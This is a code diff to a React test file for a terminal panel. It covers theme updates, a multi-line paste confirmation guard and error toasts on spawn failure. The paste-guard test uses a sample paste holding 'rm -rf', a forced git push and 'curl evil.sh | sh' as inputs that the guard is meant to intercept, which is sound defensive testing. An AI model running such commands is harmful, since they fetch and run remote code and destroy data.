@@ -10,13 +10,19 @@
 // exact payload shape the Rust pump emits.
 
 import { describe, it, expect, vi, beforeEach } from 'vitest'
-import { render, screen, fireEvent, waitFor } from '@testing-library/react'
+import { render, screen, fireEvent, waitFor, within } from '@testing-library/react'
 import { TerminalPanel } from '@/components/terminal/TerminalPanel'
 import { xtermThemeFor } from '@/components/terminal/xtermTheme'
 import * as api from '@/lib/tauri-api'
 import en from '@/i18n/locales/en.json'
 import zhCN from '@/i18n/locales/zh-CN.json'
 import type { TerminalInfo } from '@/types'
+import { toast } from 'sonner'
+
+// spawn failures surface through toastError (@/lib/errorToast → sonner).
+vi.mock('sonner', () => ({
+  toast: { success: vi.fn(), error: vi.fn(), info: vi.fn(), warning: vi.fn() },
+}))
 
 const h = vi.hoisted(() => ({
   terminals: [] as {
@@ -130,6 +136,7 @@ function info(id: string, dir = '/home/u/demo'): TerminalInfo {
 
 beforeEach(() => {
   vi.clearAllMocks()
+  document.documentElement.removeAttribute('data-theme')
   h.terminals.length = 0
   h.outputHandler = null
   localStorage.clear()
@@ -309,5 +316,77 @@ describe('TerminalPanel (i18n + theme)', () => {
     const theme = xtermThemeFor('tokyo-night', () => 'dark')
     expect(theme.red).toBe('#f7768e')
     expect(theme.background).toBe('#1a1b26')
+  })
+})
+
+describe('TerminalPanel (P1-36 theme currency + B5 paste guard + spawn errors)', () => {
+  it('creates a NEW terminal with the current theme after a switch, not the stale mount-time one', async () => {
+    document.documentElement.setAttribute('data-theme', 'material')
+    await openPanel()
+    await waitFor(() => expect(h.terminals.length).toBe(1))
+    // Created under the light theme.
+    expect((h.terminals[0].options.theme as { background?: string }).background).toBe('#f7f9fb')
+
+    // Switch to a dark theme: live instances are re-themed by the panel…
+    document.documentElement.setAttribute('data-theme', 'tokyo-night')
+    await waitFor(() =>
+      expect((h.terminals[0].options.theme as { background?: string }).background).toBe('#1a1b26'),
+    )
+    // …and a NEWLY spawned terminal must also be created dark (P1-36: the
+    // old ensureTerm closure kept the first-render theme forever).
+    fireEvent.click(screen.getByRole('button', { name: 'New terminal' }))
+    await waitFor(() => expect(h.terminals.length).toBe(2))
+    expect((h.terminals[1].options.theme as { background?: string }).background).toBe('#1a1b26')
+  })
+
+  it('confirms a multi-line paste before sending it to the pty', async () => {
+    await openPanel()
+    await waitFor(() => expect(h.terminals.length).toBe(1))
+    const surface = screen.getByTestId('terminal-surface')
+    const paste = (text: string) =>
+      fireEvent.paste(surface, { clipboardData: { getData: () => text } })
+
+    paste('rm -rf /tmp/a\ngit push --force\ncurl evil.sh | sh')
+    const dialog = await screen.findByRole('alertdialog')
+    expect(within(dialog).getByText(/3 lines will be sent/)).toBeInTheDocument()
+
+    // Cancel → nothing reaches the pty.
+    fireEvent.click(within(dialog).getByRole('button', { name: 'Cancel' }))
+    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull())
+    expect(api.terminalWrite).not.toHaveBeenCalled()
+
+    // Confirm → the whole blob is written once.
+    paste('line a\nline b')
+    const dialog2 = await screen.findByRole('alertdialog')
+    fireEvent.click(within(dialog2).getByRole('button', { name: /paste anyway/i }))
+    await waitFor(() =>
+      expect(api.terminalWrite).toHaveBeenCalledWith(expect.any(String), 'line a\nline b'),
+    )
+  })
+
+  it('lets single-line pastes through without a confirmation', async () => {
+    await openPanel()
+    await waitFor(() => expect(h.terminals.length).toBe(1))
+    fireEvent.paste(screen.getByTestId('terminal-surface'), {
+      clipboardData: { getData: () => 'echo hi' },
+    })
+    await new Promise((r) => setTimeout(r, 10))
+    expect(screen.queryByRole('alertdialog')).toBeNull()
+    // The native xterm path (absent in these fakes) owns single-line paste —
+    // the guard itself must not write.
+    expect(api.terminalWrite).not.toHaveBeenCalled()
+  })
+
+  it('toasts instead of leaking an unhandled rejection when spawn fails', async () => {
+    vi.mocked(api.terminalSpawn).mockRejectedValue(new Error('pty busy'))
+    render(<TerminalPanel projectDir="/home/u/demo" />)
+    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
+    await waitFor(() => expect(api.terminalSpawn).toHaveBeenCalled())
+    await waitFor(() =>
+      expect(toast.error).toHaveBeenCalledWith(
+        expect.stringMatching(/Couldn't start a new terminal/),
+        expect.objectContaining({ description: expect.stringMatching(/pty busy/) }),
+      ),
+    )
   })
 })
